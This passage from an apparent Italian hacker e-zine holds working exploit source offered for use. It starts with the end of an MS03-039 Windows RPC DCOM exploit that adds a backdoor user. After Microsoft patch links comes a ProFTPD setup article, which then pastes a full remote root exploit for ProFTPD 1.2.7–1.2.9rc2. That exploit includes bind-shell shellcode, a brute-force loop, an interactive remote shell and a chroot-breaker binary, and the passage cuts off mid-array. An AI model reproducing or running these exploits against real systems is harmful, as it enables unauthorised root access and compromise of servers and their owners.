0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00
,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C
,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

struct
{
	char	*os;
	DWORD	dwTopSeh;
	char	*seh;
	DWORD	dwJmpAddr;
	char	*jmp;
}
targets[] =
{
	{ "2kEnSp4+MS03-026", 
		0x7c54144c,
		"kernel32.dll v5.0.2195.6688",
		0x77a1b496,
		"OLEAUT32.dll v2.40.4522.0"},
	{ "2kEnSp3+SomeHotFixs+MS03-026", 
		0x77eda1f0,
		"kernel32.dll v5.0.2195.6079",
		0x77a1afa9,
		"OLEAUT32.dll v2.40.4518.0"}
}, v;
void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];
	int	i, iType;

	printf( "MS03-039 RPC DCOM long filename heap buffer overflow exp v1\n"
			"testato by Cyberdude <cyberdudeIL@libero.it>\n"
			"Informazionelibera founder\n"
			"Welcome to http://www.informazionelibera.cjb.net\n"
			"If success, target will add a user \"e\" and password is \"asd#321\"\n\n");

	if(argc!=3)
	{
		printf("Usage: %s <target> <type>\n", argv[0]);
		for(i = 0; i < sizeof(targets)/sizeof(v); i++)
			printf( "<%d>   %s\n"
					"      TopSeh=0x%.8x in %s\n"
					"      JmpAddr=0x%.8x in %s\n",
					i, targets[i].os,
					targets[i].dwTopSeh, targets[i].seh,
					targets[i].dwJmpAddr, targets[i].jmp);
		return;
	}

	iType = atoi(argv[2]);
	if((iType<0) || iType > sizeof(targets)/sizeof(v))
	{
		printf("[-] Wrong type.\n");
		return;
	}

	memcpy(&sc[sc_offset], sc_add_user, sizeof(sc_add_user));
	memcpy(&sc[jmp_addr_offset], &targets[iType].dwJmpAddr,4);
	memcpy(&sc[top_seh_offset], &targets[iType].dwTopSeh,4);
	printf("[+] Prepare shellcode completed.\n");

    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    
    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf("Connect failed.Error:%d",WSAGetLastError());
        return;
    }
	printf("[+] Connect to %s:135 success.\n", argv[1]);

	if(sizeof(sc_add_user) > sc_max)
	{
		printf("[-] shellcode too long, exit.\n");
		return;
	}

 
    len=sizeof(sc);
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;  //¼ÆËãÎÄ¼þÃûË«×Ö½Ú³¤¶È
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;//¼ÆËãÎÄ¼þÃûË«×Ö½Ú³¤¶È
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sc,sizeof(sc));
    len1=len1+sizeof(sc);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;
    //¼ÆËã¸÷ÖÖ½á¹¹µÄ³¤¶È
    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;  
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;

    len = send(sock,bindstr,sizeof(bindstr),0);
	if(len<=0)
    {
            printf("[-] Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
 	else
		printf("[+] send %d bytes.\n", len);
	
    len=recv(sock,buf1,1000,0);
	if(len<=0)
	{
		printf("[-] recv error:%d\n", GetLastError());
		return;
	}
	else
		printf("[+] recv %d bytes.\n", len);

    len = send(sock,buf2,len1,0);
	if(len<=0)
    {
            printf("[-] Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
	else
		printf("[+] send %d bytes.\n", len);
    len=recv(sock,buf1,1024,0);
	if(len<=0)
	{
		printf("[+] Target crash or exploit success? :)\n");
	}
	else
		printf("[-] recv %d bytes. Bad luck!\n", len);
}

------------------------------------------------------[FINE SORGENTE]-----------


Occhio però cari i miei ragazzi perché la Microsoft ha gia rilasciato  le patch 
per questa falla:Microsoft Windows RPCSS malformed DCOM message buffer overflow 
vulnerabilities , che potete scaricare ai seguenti link : 

Windows NT Workstation: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=7EABAD74-9CA9-48F4-8DB5
-CF8C188879DA&displaylang=en 
 
Windows NT Server 4.0: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=71B6135C-F957-4702-B376
-2DACCE773DC0&displaylang=en 
 
Windows NT Server 4.0, Terminal Server Edition: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=677229F8-FBBF-4FF4-A2E9
-506D17BB883F&displaylang=en 
 
Windows 2000: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=F4F66D56-E7CE-44C3-8B94
-817EA8485DD1&displaylang=en 
 
Windows XP: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=5FA055AE-A1BA-4D4A-B424
-95D32CFC8CBA&displaylang=en 
 
Windows XP 64 bit Edition: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=50E4FB51-4E15-4A34-9DC3
-7053EC206D65&displaylang=en 
 
Windows XP 64 bit Edition Version 2003: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=80AB25B3-E387-441F-9B6D
-84106F66059B&displaylang=en 
 
Windows Server 2003: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=51184D09-4F7E-4F7B-87A4
-C208E9BA4787&displaylang=en 
 
Windows Server 2003 64 bit Edition: 
http://www.microsoft.com/downloads/details.aspx?FamilyId=80AB25B3-E387-441F-9B6D
-84106F66059B&displaylang=en

Penso che non ci sia altro da aggiungere su questo  argomento…  se  serve altro 
chiedete ok? Ora vi saluto ragazzi… alla prossima

Cyberdude 


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: ProFTPd 1.2.7 configurazione e vulnerabilità                        |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Buona  sera  a  tutti ragazzi… oggi giovedì 16 ottobre 2003 sono appena  tornato
dalla piazza, da poco ho finito di papparmi un bel gattò fatto da mammà!! E  ora
con  lo  stomaco  pieno sono qui vicino (come al solito) a scrivere  un  piccolo
articoletto giusto per diffondere l’informazione… hhihihi questa storia ormai  è
diventata  il  mio  credo! Informiamo sempre di più la  gente,  se  solo  ognuno
dicesse quel poco che sa (come faccio io) allora tutti sapremmo qualcosa in più!
Comunque  basta  con  tutte queste presentazioni da 4 soldi  e  proseguiamo  con
l’articolo. Di cosa posso parlarvi? Vediamo un po’!!io di cose non ne so  molte…
ah  ecco  potrei parlarvi di ProFTPD, vediamo chi indovina cosa sia 1,2,3  vabbè
tempo  scaduto ve lo dico io, si tratta di un server ftp sostitutivo al  ftp  di
default  incluso con OSX, le caratteristiche interessanti di cui potrei parlarvi
sono le seguenti :
1.  configurabilità elevata
2.  personalizzabilità idem come sopra
Questo  server Opens Source riguarda sistemi operativi quali RedHat e Suse.  Per
quanto  riguarda la reperibilità del prodotto in questione è molto semplice,  ci
basta  collegarci al suo sito http://www.proftpd.org/  e scaricare il  programma
all’indirizzo       ftp://ftp.proftpd.org/distrib/source/proftpd-1.2.9rc3.tar.gz
…Adesso passiamo alla configurazione del server.
1.   Decomprimiamo i sorgenti ed entriamo nella relatva cartella --> tar  zxvf
     proftpd-1.2.7.tar.gz - cd proftpd-1.2.7
2.  configuriamo l'installazione e compiliamo --> ./configure – make
3.  installiamo --> make install
4.  ed ora la vera e proprio configurazione --> pico/usr/local/etc/proftpd.conf
Dunque come prima cosa andiamo a cercare la stringa che inizia per ServerName  e
inseriamoci  l’indirizzo  del nostro server DynDNS poi  cerchiamo  la  riga  che
inizia  con ServerType e sostituiamo "standalone" con "inetd” … poi alla stringa
Group  al  posto  di "nogroup” ci mettiamo "nobody" . A questo punto  dopo  aver
disattivato   il   server  FTP  dal  pannello  di  controllo,   lanciamo   "pico
/etc/xinetd.d/ftp  dove  nella  stringa server = /usr/libexec/ftpd   sostituiamo
/usr/libexec/ftpd    con   /usr/local/sbin/proftpd  .  Adesso   lanciamo   "pico
/etc/xinetd.d/ftp"… ora dove c’è server_args = -1 sostituiamo  il  –1  con  Well
done.  Tutto  qui,  cosa ci resta fare adesso?? Per avviare il  server  FTP  dal
pannello  condivisione  e  da  un altro computer sulla  stessa  LAN  proviamo  a
digitare "ftp indirizzodelcomputerconsuproftpd"

E  qui abbiamo discusso un po’ su come scarica, installare, configurare, avviare
il  server  in questione… ma voi vi chiederete, qual è il bello della faccenda??
Che  come  al  solito  non  poteva mancare una vulnerabilità  sull’argomento  in
questione!! Hihihi dunque di cosa si tratta?? È un Exploit testato su SuSE  8.0,
8.1  e  RedHat  7.2/8.0.  La  RedHat riscontra la  vulnerabilità  nella  regione
0xbffff2xx  mentre  il Suse in quella 0xbfffe8xx ora qui di  seguito  vi  allego
l’exploit che richiameremo tramite la stringa : ./proft_put_down -t hostname  -l
localIP  -U incoming dove hostname = target box e localIP = il vostro  indirizzo
IP. Adesso che devo dirvi più?? Vedete dove sta scritto –U ?? bene questo sapete
a cosa serve? A creare una directory nella quale lavorerà sul server ftp remoto.
Senza  esso è difficile che l’exploit funzioni. Detto questo vi allego l’exploit
e vi saluto alla prossima volta!! Ciao ragazzi

-[sorgente exploit ProFTPd 1.2.7 - 1.2.9rc2 Remote Root & brute-force]----------



#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

#define STACK_START 0xbfffef04
#define STACK_END 0xbffff4f0
#define FTP_PORT 21
#define BINDSHELL_PORT 4660
#define SIZE 1024
#define EXPLOIT_BUF_SIZE 65535
#define DEFAULT_USER "anonymous"
#define DEFAULT_PASS "ftp@"
#define FAILURE -1
#define SUCCESS 0
#define NORMAL_DOWNLOAD 1
#define EXPLOIT_DOWNLOAD 2
#define DOWNLOAD 3
#define UPLOAD 4
#define ACCEPT_TIMEOUT 5
#define SLEEP_DELAY 19999999

/*
Leet 0-day HaggisCode (tm)
*/
char shellcode[] =
// setuid(0); setgid(0);
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"

// fork() - parent terminates, killing proftpd and ending FTP
// session. This leaves the child process as a daemon...
"\x31\xc0\xb0\x02\xcd\x80\x89\xc3\x85\xdb\x74\x08\x31"
"\xdb\x31\xc0\xb0\x01\xcd\x80"

// Finally, bind a shell to port 4660.
// This is a hacked version of the bindshell code by BigHawk.
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68\x12\x34\x43\x66\x53\x89\xe1\xb0\x10\x50\x51"
"\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57"
"\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68\x2e\x2f\x61\x61\x89\xe3\x51\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

int controlSock, passiveSock;
int currentPassivePort=32769;
int currentServerPort=31337;
int exploitBufLen;
int attemptNumber=0;
int ftpPort=FTP_PORT;
unsigned int stackWriteAddr, retAddr;
char serverBuf[SIZE];
char exploitBuf[EXPLOIT_BUF_SIZE];
char uploadPath[SIZE]="";
char filename[SIZE*2];
char *server=NULL;
char *user=DEFAULT_USER;
char *pass=DEFAULT_PASS;
char *localIP=NULL;
char errorBuf[SIZE];

int connect_to_server(int port);
int login_to_server();
int set_passive_mode(int mode);
int set_ascii_mode();
int set_path_and_filename();
int check_for_linefeed();
int check_status();
int create_passive_server();
int create_exploit_buffer();
int upload_file();
int download_file(int mode);
void usage(char *s);
int do_remote_shell(int shellSock);
void status_bar(char *info);
int timeout_accept(int s, struct sockaddr *sa, int *f);
void my_send(int s, char *b, ...);
void my_recv(int s);
void my_sleep(int n);
void doris_chroot_breaker();

int main(int argc,char **argv)
{
int sleepMode=0;
char c;
unsigned int stackStartAddr=STACK_START;

if(argc<2) usage(argv[0]);
while((c = getopt(argc, argv, "t:u:p:l:U:sP:S:"))!= EOF) {
switch (c) {
case 't':
server=optarg;
break;
case 'u':
user=optarg;
break;
case 'p':
pass=optarg;
break;
case 'l':
localIP=optarg;
break;
case 's':
sleepMode=1;
break;
case 'U':
strncpy(uploadPath,optarg,SIZE);
break;
case 'P':
ftpPort=atoi(optarg);
break;
case 'S':
stackStartAddr=strtoul(optarg, NULL, 16);
break;
default:
usage(argv[0]);
return 1;
}
}
if(server==NULL || localIP==NULL)
usage(argv[0]);

printf("proftpd 1.2.7 - 1.2.9rc2 remote r00t exploit\n");
printf(" by Haggis (haggis@haggis.kicks-ass.net)\n");

doris_chroot_breaker();
for(stackWriteAddr=stackStartAddr; stackWriteAddr<STACK_END; stackWriteAddr+=4, attemptNumber++) {

if(check_for_linefeed()==FAILURE)
continue;

retAddr=stackWriteAddr+200; // good enough for show business

if((controlSock=connect_to_server(ftpPort))==FAILURE) {
perror("\n\nFailing to connect to remote host\n");
exit(1);
}

if(login_to_server()==FAILURE) {
close(controlSock);
printf("\nERROR: Login failed.\n");
exit(1);
}

if(set_passive_mode(UPLOAD)==FAILURE)
goto err;
if(set_ascii_mode()==FAILURE)
goto err;
if(set_path_and_filename()==FAILURE)
goto err;

// create the buffer containing RET for this
// brute-force iteration
create_exploit_buffer();

if(upload_file()==FAILURE)
goto err;
close(controlSock);

// Connect again, then login, set ASCII mode and download the exploit file.
// This will trigger the overflow; as a result, we've
// corrupted the memory pool of this session and when we
// download the file again, the stack area will be overwritten
// and we control the saved EIP.

if((controlSock=connect_to_server(ftpPort))<0) {
perror("\nFailed to connect to remote host\n");
exit(1);
}

login_to_server(user,pass);
set_path_and_filename();
if(set_ascii_mode()==FAILURE)
goto err;
if(set_passive_mode(DOWNLOAD)==FAILURE)
goto err;
if(sleepMode)
sleep(10);
if(download_file(NORMAL_DOWNLOAD)==FAILURE)
goto err;

// Finally, read the file again. This will trigger the stack
// overwrite (NOT the overflow, that happened earlier). We could
// control EIP at this point and r00t may be only heartbeat away...

if(set_passive_mode(DOWNLOAD)==FAILURE)
goto err;
if(download_file(EXPLOIT_DOWNLOAD)==FAILURE)
goto err;
err: 
close(controlSock);
}

// This is only reached if the bruteforce fails.
// delete the exploit files here

printf("\n\nNo r00t for you today I'm afraid.\n");
exit(1);
}

void status_bar(char *info) {
printf("[ %20s ]-[ Stack: 0x%08x ]-[ RET: 0x%08x ]\r",info, stackWriteAddr,retAddr);
fflush(stdout);
}

int set_path_and_filename()
{
status_bar("Setting filename");
if(strcmp(uploadPath,"")) {
my_send(controlSock, "CWD %s\r\n",uploadPath);
my_recv(controlSock);
}
snprintf(filename,SIZE,"proft_put_down-%d-%d.txt",getpid(),attemptNumber);
return SUCCESS;
}

int download_file(int mode)
{
int len, localServerSock, dataSock, bindShellSock;
struct sockaddr_in localServer;

status_bar("Downloading");
// Ask the victim server to send us the exploit file
my_send(controlSock, "RETR %s\r\n", filename);

// Create a listening server on our passive port to
// receive the data
memset(&localServer,0,sizeof(localServer));
localServerSock=create_passive_server();
len=sizeof(localServer);

// Wait for a few seconds for the victim server to contact us...
if((dataSock=timeout_accept(localServerSock,(struct sockaddr *)&localServer,&len))<0) {
close(localServerSock);
return FAILURE;
}

// If the mode is EXPLOIT_DOWNLOAD, then this is the
// second attempt at downloading... that means we might
// have a shell waiting for us on the victim server, so
// we try to connect to it
if(mode==EXPLOIT_DOWNLOAD) {
if((bindShellSock=connect_to_server(BINDSHELL_PORT))>=0) {
printf("\nConnected! You are r00t...\n");
do_remote_shell(bindShellSock);
printf("\nDid you have a nice time?\n");
exit(0);
} 
close(dataSock);
close(localServerSock);
return SUCCESS;
}
// If the mode is NORMAL_DOWNLOAD, then just clean up the
// connection by receiving the file from the server; closing
// the data and local server sockets, then read the confirmation
// message from the control socket
my_recv(dataSock);
close(dataSock);
close(localServerSock);
my_recv(controlSock);
return check_status();
}

int timeout_accept(int s, struct sockaddr *sa, int *f)
{
fd_set fdset;
struct timeval timeout = { ACCEPT_TIMEOUT, 0 }; // seconds
int result;

if(s<=0)
return FAILURE;
FD_ZERO(&fdset);
FD_SET(s, &fdset);

if((result=select(s+1, &fdset, 0, 0, &timeout))==0)
return FAILURE;
return accept(s,sa,f);
}

int set_passive_mode(int mode)
{
int portMSB, portLSB;
int x1,x2,x3,x4;
char *ptr=localIP, *start;

status_bar("Setting passive");
if(mode==DOWNLOAD) {
if((++currentPassivePort) > 35000)
currentPassivePort=32789;

while(*(++ptr))
if(*ptr=='.')
*ptr=',';
portMSB=(currentPassivePort >> 8 ) & 0xff;
portLSB=currentPassivePort & 0xff;
my_send(controlSock, "PORT %s,%d,%d\r\n", localIP, portMSB, portLSB);
my_recv(controlSock);
return check_status();
} else { 
my_send(controlSock, "PASV\r\n");
my_recv(controlSock);
if(check_status()==FAILURE)
return FAILURE;
ptr=serverBuf;
while(*ptr && *ptr!='(')
ptr++;
if(*ptr=='\0')
return FAILURE;
start=ptr+1;
while(*ptr && *ptr!=')')
ptr++;
*ptr=0;
sscanf(start, "%d,%d,%d,%d,%d,%d",&x1, &x2, &x3, &x4, &portMSB, &portLSB);
currentServerPort=(portMSB << 8) | portLSB;
}
return SUCCESS; 
}

int connect_to_server(int port)
{
struct sockaddr_in serverAddr;
struct hostent *host;
int sock, tmp=1;

status_bar("Connecting");
if((host=gethostbyname(server))==NULL)
return FAILURE;

if((sock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))<0)
return FAILURE;
bzero(&serverAddr,sizeof(struct sockaddr));
serverAddr.sin_family=AF_INET;
serverAddr.sin_port=htons(port);
serverAddr.sin_addr=*((struct in_addr *)host->h_addr);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&tmp, sizeof(tmp));
if(connect(sock,(struct sockaddr *)&serverAddr,sizeof(struct sockaddr))<0) {
close(sock);
return FAILURE;
}
return sock;
}

int check_status()
{
if(isdigit(serverBuf[0]) && serverBuf[0]!='5')
return SUCCESS;
else
return FAILURE;
}

int login_to_server()
{
status_bar("Logging in");
my_recv(controlSock);
my_send(controlSock, "USER %s\r\n", user);
my_recv(controlSock);
if(check_status()==FAILURE)
return FAILURE;

my_send(controlSock, "PASS %s\r\n", pass); 
my_recv(controlSock);
return check_status();
}

int set_ascii_mode()
{
status_bar("Setting ASCII mode");
my_send(controlSock, "TYPE A\r\n");
my_recv(controlSock);
return check_status();
}


int upload_file()
{
int dataSock;

status_bar("Uploading file");

// open up the data channel
if((dataSock=connect_to_server(currentServerPort))==FAILURE)
return FAILURE;

// tell server we're gonna send some shiznitz
my_send(controlSock, "STOR %s\r\n", filename);
my_recv(controlSock);
if(check_status()==FAILURE) {
close(dataSock);
return FAILURE;
}

// send the exploit file to the victim server
send(dataSock, exploitBuf, exploitBufLen, 0);
close(dataSock);

// make sure all went well
my_recv(controlSock);
if(check_status()==FAILURE)
return FAILURE;
return SUCCESS;
}

int create_exploit_buffer()
{
int i;
char buf[41];
unsigned int writeaddr=stackWriteAddr;
unsigned int *ptr=(unsigned int *)(exploitBuf+3);
unsigned int dummy=0x11111111;
FILE *fp;

status_bar("Make exploit buf");
exploitBufLen=1024;
memset(exploitBuf,0,EXPLOIT_BUF_SIZE);
memset(exploitBuf,0x90,512);
*(ptr++)=writeaddr+28;
for(i=0;i<6;i++)
*(ptr++)=retAddr;
*(ptr++)=0;
for(i=0;i<2;i++)
*(ptr++)=retAddr;

memcpy(exploitBuf+512-strlen(shellcode)-1,shellcode,strlen(shellcode));
memset(exploitBuf+512,'\n',512);

for(i=0;i<96;i++) {
memset(buf,0,41);
if(dummy==0x1111112e)
// this sets session.d->outstrm to NULL which forces an early return
// avoids crashing proftpd... on SuSE 8.0 anywayz...
memcpy(buf,"\n\n\n\n\n\n\n\n\x00\x00\x00\x00\n\n\n\n\n\n\n\n",20);
else if(dummy==0x11111166)
// this is the same thing tailored for RH7.2
memcpy(buf,"\n\n\n\n\n\n\n\n\x72\x00\x00\x00\x00\n\n\n\n\n\n\n",20);
else
memset(buf,'\n',20);

// i used these dummy values to find the correct spot for
// the session.d->outstrm pointer
*(unsigned int *)(buf+20)=dummy;
*(unsigned int *)(buf+24)=dummy;
*(unsigned int *)(buf+28)=dummy;

// this will become the address of an available chunk of memory
// that is returned by new_block() in pool.c
*(unsigned int *)(buf+32)=writeaddr;

// this is what will be returned by palloc() in pool.c
// palloc() is the function that calls new_block() and
// provides the allocation interface for the pools system.
*(unsigned int *)(buf+36)=writeaddr;

memcpy(exploitBuf+exploitBufLen,buf,40);
exploitBufLen+=40;
dummy++;
}
return SUCCESS;
}


int create_passive_server()
{
struct sockaddr_in serverAddr;
int on=1,sock;

status_bar("Creating server");
sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
memset(&serverAddr,0,sizeof(struct sockaddr_in));
serverAddr.sin_port=htons(currentPassivePort);
serverAddr.sin_family=AF_INET;
serverAddr.sin_addr.s_addr=htonl(INADDR_ANY);
setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on));
if(bind(sock,(struct sockaddr *)&serverAddr,sizeof(struct sockaddr))<0) {
close(sock);
return FAILURE;
}
if(listen(sock,5)<0) {
close(sock);
return FAILURE;
}
return sock;
}

void usage(char *exploitName)
{
printf("proftpd 1.2.7 - 1.2.9rc2 remote root exploit\n");
printf(" based on code by bkbll (bkbll@cnhonker.net)\n");
printf(" by Haggis (haggis@haggis.kicks-ass.net)\n");
printf("--------------------------------------------------------------\n");
printf("Usage: %s -t host -l ip [options]\n",exploitName);
printf("Arguments:\n");
printf(" -t <host> host to attack\n");
printf(" -u <username> [anonymous]\n");
printf(" -p <password> [ftp@microsoft.com]\n");
printf(" -l <local ip address> interface to bind to\n");
printf(" -s sleep for 10secs to allow GDB attach\n");
printf(" -U <path> specify upload path, eg. /incoming\n");
printf(" -P <port> port number of remote proftpd server\n");
printf(" -S <address> start at <address> when bruteforcing\n");
exit(0);
}


int do_remote_shell(int shellSock)
{
fd_set rfds;
char buf[1024];
int retval, r=1;

do {
FD_ZERO(&rfds);
FD_SET(0, &rfds);
FD_SET(shellSock, &rfds);
retval=select(shellSock+1, &rfds, NULL, NULL, NULL);
if(retval) {
if(FD_ISSET(shellSock, &rfds)) {
buf[(r=recv(shellSock, buf, sizeof(buf)-1,0))]='\0'; // lol
printf("%s", buf);fflush(stdout);
}
if(FD_ISSET(0, &rfds)) {
buf[(r=read(0, buf, sizeof(buf)-1))]='\0'; // lmfao
send(shellSock, buf, strlen(buf), 0);
}
}
} while(retval && r); // loop until connection terminates
return SUCCESS;
}


int check_for_linefeed()
{
char *ptr=(char *)&stackWriteAddr;
int i=4;

for(;i;i--)
if(*(ptr++)=='\n')
return FAILURE;
return SUCCESS;
}

// Handy little function to send formattable data down a socket.
void my_send(int s, char *b, ...) {
va_list ap;
char *buf;

my_sleep(SLEEP_DELAY);
va_start(ap,b);
vasprintf(&buf,b,ap);
send(s,buf,strlen(buf),0);
va_end(ap);
free(buf);
}

// Another handy function to read data from a socket.
void my_recv(int s) {
int len;

my_sleep(SLEEP_DELAY);
memset(serverBuf, 0, SIZE);
len=recv(s, serverBuf, SIZE-1, 0);
serverBuf[len]=0;
}

void doris_chroot_breaker() {
char haggis_magic_buffer[]=
"\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x02\x00\x03\x00\x01\x00\x00\x00\x80\x80\x04\x08\x34\x00\x00\x00"
"\xa0\x01\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00"
"\x09\x00\x08\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08"
"\x00\x80\x04\x08\x20\x01\x00\x00\x20\x01\x00\x00\x05\x00\x00\x00"
"\x00\x10\x00\x00\x01\x00\x00\x00\x20\x01\x00\x00\x20\x91\x04\x08"
"\x20\x91\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00"
"\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x55\x89\xe5\x83\xec\x6c\x57\x56\x53\x8d\x45\xa0\x8d\x7d\xa0\xbe"
"\xc0\x80\x04\x08\xfc\xb9\x17\x00\x00\x00\xf3\xa5\x66\xa5\xa4\x8d"
"\x45\xa0\x89\x45\x9c\x8b\x5d\x9c\xff\xd3\x8d\x65\x88\x5b\x5e\x5f"
"\x89\xec\x5d\xc3\x8d\xb6\x00\x00\x00\x00\x8d\xbf\x00\x00\x00\x00"
"\x31\xc0\x31\xdb\x40\x50\x89\xe1\x66\xbb\x73\x68\x53\x89\xe3\xb0"
"\x27\xcd\x80\x31\xc0\x89\xe3\xb0\x3d\xcd\x80\x31\xc9\xb1\x0a\x31"
"\xc0\x31\xdb\x66\xbb\x2e\x2e\x53\x89\xe3\xb0\x0c\xcd\x80\x49\x85"
"\xc9\x75\xec\x31\xc0\x31\xdb\xb3\x2e\x53\x89\xe3\xb0\x3d\xcd\x80"
"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x00\x00"
"\x00\x47\x43\x43\x3a\x20\x28\x47\x4e\x55\x29\x20\x32\x2e\x39\x35"
"\x2e\x33\x20\x32\x30\x30\x31\x30\x33\x31\x35\x20\x28\x53\x75\x53"
"\x45\x29\x00\x08\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x30"
"\x31\x2e\x30\x31\x00\x00\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00"
"\x2e\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61"
"\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00"
"\x2e\x64\x61\x74\x61\x00\x2e\x73\x62\x73\x73\x00\x2e\x62\x73\x73"
"\x00\x2e\x63\x6f\x6d\x6d\x65\x6e\x74\x00\x2e\x6e\x6f\x74\x65\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00"
"\x06\x00\x00\x00\x80\x80\x04\x08\x80\x00\x00\x00\x40\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00"
"\x21\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\xc0\x80\x04\x08"
"\xc0\x00\x00\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x20\x00\x00\x00\x00\x00\x00\x00\x29\x00\x00\x00\x01\x00\x00\x00"
"\x03\x00\x00\x00\x20\x91\x04\x08\x20\x01\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
"\x2f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x20\x91\x04\x08"
"\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x35\x00\x00\x00\x08\x00\x00\x00"
"\x03\x00\x00\x00\x20\x91\x04\x08\x20\x01\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
"\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x20\x01\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x43\x00\x00\x00\x07\x00\x00\x00"
